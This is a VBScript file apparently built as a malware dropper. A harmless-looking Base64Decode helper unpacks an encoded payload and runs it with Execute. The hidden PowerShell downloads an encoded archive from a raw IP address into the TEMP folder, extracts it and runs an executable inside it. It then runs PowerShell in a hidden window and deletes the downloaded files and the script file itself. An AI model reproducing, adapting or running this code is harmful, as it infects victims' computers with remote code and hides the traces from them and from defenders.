Function Base64Decode(ByVal base64String)

  Const Base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  Dim dataLength, sOut, groupBegin
  
  'remove white spaces, If any
  base64String = Replace(base64String, vbCrLf, "")
  base64String = Replace(base64String, vbTab, "")
  base64String = Replace(base64String, " ", "")
  
  'The source must consists from groups with Len of 4 chars
  dataLength = Len(base64String)
  If dataLength Mod 4 <> 0 Then
    Err.Raise 1, "Base64Decode", "Bad Base64 string."
    Exit Function
  End If

  
  ' Now decode each group:
  For groupBegin = 1 To dataLength Step 4
    Dim numDataBytes, CharCounter, thisChar, thisData, nGroup, pOut
    ' Each data group encodes up To 3 actual bytes.
    numDataBytes = 3
    nGroup = 0

    For CharCounter = 0 To 3
      ' Convert each character into 6 bits of data, And add it To
      ' an integer For temporary storage.  If a character is a '=', there
      ' is one fewer data byte.  (There can only be a maximum of 2 '=' In
      ' the whole string.)

      thisChar = Mid(base64String, groupBegin + CharCounter, 1)

      If thisChar = "=" Then
        numDataBytes = numDataBytes - 1
        thisData = 0
      Else
        thisData = InStr(1, Base64, thisChar, vbBinaryCompare) - 1
      End If
      If thisData = -1 Then
        Err.Raise 2, "Base64Decode", "Bad character In Base64 string."
        Exit Function
      End If

      nGroup = 64 * nGroup + thisData
    Next
    
    'Hex splits the long To 6 groups with 4 bits
    nGroup = Hex(nGroup)
    
    'Add leading zeros
    nGroup = String(6 - Len(nGroup), "0") & nGroup
    
    'Convert the 3 byte hex integer (6 chars) To 3 characters
    pOut = Chr(CByte("&H" & Mid(nGroup, 1, 2))) + _
      Chr(CByte("&H" & Mid(nGroup, 3, 2))) + _
      Chr(CByte("&H" & Mid(nGroup, 5, 2)))
    
    'add numDataBytes characters To out string
    sOut = sOut & Left(pOut, numDataBytes)
  Next

  Base64Decode = sOut
End Function

sCode = Base64Decode("DQpzID0gIiRkb3dubG9hZHVybCA9ICdodHRwOi8vMTc4LjIwOC45Mi45NS93b3JraW5nLzExMTEudHh0JyIgICYgdmJOZXdMaW5lICYgXw0KICAgICJJbnZva2UtV2ViUmVxdWVzdCAkZG93bmxvYWR1cmwgLU91dEZpbGUgJGVudjpURU1QXDExMTEudHh0IiAmIHZiTmV3TGluZSAmIF8NCiAgICAiW0lPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCRlbnY6VEVNUCsnXGhzdGNoay56aXAnLCBbQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoW2NoYXJbXV1bSU8uRmlsZV06OlJlYWRBbGxCeXRlcygkZW52OlRFTVArJ1wxMTExLnR4dCcpKSkiICYgdmJOZXdMaW5lICYgXw0KICAgICJVbmJsb2NrLUZpbGUgLVBhdGggJGVudjpURU1QXGhzdGNoay56aXAiICYgdmJOZXdMaW5lICYgXw0KICAgICJFeHBhbmQtQXJjaGl2ZSAkZW52OlRFTVBcaHN0Y2hrLnppcCAtRGVzdGluYXRpb25QYXRoICRlbnY6VEVNUFxoc3RjaGsiICYgdmJOZXdMaW5lICYgXw0KICAgICJSZW1vdmUtSXRlbSAtUGF0aCAkZW52OlRFTVBcaHN0Y2hrLnppcCIgJiB2Yk5ld0xpbmUgJiBfDQogICAgIlJlbW92ZS1JdGVtIC1QYXRoICRlbnY6VEVNUFwxMTExLnR4dCIgJiB2Yk5ld0xpbmUgJiBfDQogICAgIiRQQVRIID0gJGVudjpURU1QICsgJ1xoc3RjaGtcd2luZXhjXHdpbmV4Yy5leGUnIiAmIHZiTmV3TGluZSAmIF8NCiAgICAiSW52b2tlLUV4cHJlc3Npb24gLUNvbW1hbmQgJFBBVEgiICYgdmJOZXdMaW5lICYgXw0KICAgICJTbGVlcCAtU2Vjb25kcyAxMCIgJiB2Yk5ld0xpbmUgJiBfDQogICAgIlJlbW92ZS1JdGVtIC1QYXRoICRlbnY6VEVNUFxoc3RjaGtcd2luZXhjIC1yZWN1cnNlIg0KDQpTZXQgZnNvID0gQ3JlYXRlT2JqZWN0KCJTY3JpcHRpbmcuRmlsZVN5c3RlbU9iamVjdCIpDQpDdXJyZW50RGlyZWN0b3J5ID0gZnNvLkdldEFic29sdXRlUGF0aE5hbWUoIi4iKQ0KTmV3UGF0aCA9IGZzby5CdWlsZFBhdGgoQ3VycmVudERpcmVjdG9yeSwgIkZpbmFsVkJTLnZicyIpDQoNClNldCBvYmpTaGVsbCA9IFdTY3JpcHQuQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikNClNldCBvRXhlYyA9IG9ialNoZWxsLkV4ZWMoInBvd2Vyc2hlbGwgLVdpbmRvd1N0eWxlIGhpZGRlbiAgLWNvbW1hbmQgIiIiICYgcyAmICIiIiAiKQ0KDQpmc28uRGVsZXRlRmlsZSBOZXdQYXRo")
Execute sCode
